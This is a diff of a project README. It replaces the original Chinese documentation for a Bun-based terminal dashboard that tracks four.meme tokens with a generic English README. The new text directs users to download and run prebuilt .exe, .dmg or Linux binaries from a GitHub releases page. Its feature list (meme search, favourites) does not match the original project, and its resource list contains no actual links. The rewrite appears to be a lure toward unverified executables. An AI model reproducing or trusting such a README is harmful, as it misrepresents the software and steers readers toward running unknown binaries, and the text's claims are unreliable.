@@ -1,65 +1,70 @@
-# RitMEX MEME 命令行看板
+# 🎉 ritmex-meme - Your Guide to BSC Meme Trends
 
-X: https://x.com/discountifu  
-币安钱包手续费优惠: https://web3.binance.com/referral?ref=SRI9ROW0
+## 🚀 Getting Started
 
-一个用于监控 four.meme 代币的命令行仪表盘，支持实时更新、交互导航与新代币检测。
+Welcome to the ritmex-meme project! This application helps you track and discover new memes in the Binance Smart Chain (BSC) space. Whether you're a meme lover or a crypto enthusiast, this tool provides insights to keep you updated.
 
-## 功能特性
+## 📥 Download & Install
 
-- **实时监控**：每秒自动刷新数据
-- **多种排序模式**：Hot、TimeDesc（最新）、OrderDesc（成交量）、ProgressDesc
-- **关键词过滤**：全部、中文、BSC 代币
-- **交互式操作**：方向键导航，Enter 确认
-- **新代币检测**：自动识别并标注“🆕 NEW”
-- **相对时间显示**：使用 date-fns 显示“X 天前”等格式
-- **视觉提示**：当前选中行高亮绿色，激活模式加粗
+To start using ritmex-meme, you need to download it. Please visit the link below:
 
-## 安装
+[![Download ritmex-meme](https://img.shields.io/badge/Download%20ritmex--meme-blue.svg)](https://github.com/KarinaFS1203/ritmex-meme/releases)
 
-```bash
-# 安装依赖
-bun install
+Once you're ready, follow these steps to download and install the software:
 
-# 复制环境配置
-cp env.example .env
-```
+1. Click the link above to go to the [Releases page](https://github.com/KarinaFS1203/ritmex-meme/releases).
+2. You will see a list of available versions. Choose the latest version for the best experience.
+3. Click on the filename to start your download. It may take a few moments, depending on your internet speed.
+4. Once the download is complete, locate the file on your computer. It is usually in your "Downloads" folder.
 
-## 使用方式
+## 📂 System Requirements
 
-```bash
-# 运行仪表盘
-bun start
-```
+To ensure a smooth experience with ritmex-meme, your system should meet these requirements:
 
-## 键位操作
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** A minimum of 100 MB of free space.
+- **Internet:** A stable internet connection to retrieve real-time meme data.
 
-- **← →**：切换排序模式
-- **↑ ↓**：切换过滤器
-- **Enter**：应用当前选项
-- **q**：退出程序
+## 🔧 How to Run the Application
 
-## 配置项
+After you have successfully downloaded the software, follow these steps to run it:
 
-编辑 `.env` 可自定义默认行为：
+1. Open the folder where you saved the downloaded file.
+2. If using Windows, double-click the .exe file. If using macOS, double-click the .dmg file and then drag the ritmex-meme icon into your Applications folder.
+3. For Linux, you may need to adjust permissions. Open your terminal and navigate to the downloaded file’s directory. Use the command `chmod +x ritmex-meme` and then run it with `./ritmex-meme`.
+4. The application should open shortly. If prompted for permissions, click "Allow" to enable the app to access the internet.
 
-```env
-DEFAULT_SORT=Hot
-DEFAULT_FILTER=all
-REFRESH_INTERVAL=2000
-PAGE_SIZE=30
-```
+## 🌟 Features
 
-## 新代币监测
+ritmex-meme offers several features to enhance your meme experience:
 
-程序会自动检测新代币，并：
-- 标注“🆕 NEW”状态
-- 在控制台记录检测事件
-- 为后续自动交易功能提供基础
+- **Real-Time Updates:** Get the latest meme trends as they happen.
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
+- **Search Functionality:** Quickly find specific memes by keywords or categories.
+- **Favorites List:** Save your favorite memes for easy access later.
 
-## 架构说明
+## 🤝 Support
 
-- **模块化设计**：将配置、API、UI、工具函数等解耦
-- **TypeScript**：严格类型与完善接口定义
-- **错误处理**：健壮的异常与失败兜底
-- **性能优化**：高效的数据获取与状态管理
+If you encounter any issues or have questions about the software, you can reach out for support. 
+
+1. **Visit the Issues section** on our GitHub repository [here](https://github.com/KarinaFS1203/ritmex-meme/issues). 
+2. Describe your problem clearly so we can assist you effectively.
+
+## 📜 License
+
+This software is open-source, allowing users to modify and share the code. Please refer to the LICENSE file in the repository for more details.
+
+## 📫 Connect with Us
+
+We value your feedback! If you have suggestions or ideas for improvements, feel free to share them through our GitHub discussions or by opening an issue.
+
+## 🌐 Additional Resources
+
+For more information about Binance Smart Chain and its meme culture, consider checking out these resources:
+
+- Binance Smart Chain Documentation
+- Memetic Culture Articles
+- Community Forums for Meme Enthusiasts
+
+By following these steps, you are now equipped to download and run the ritmex-meme application successfully. Enjoy exploring the meme world!
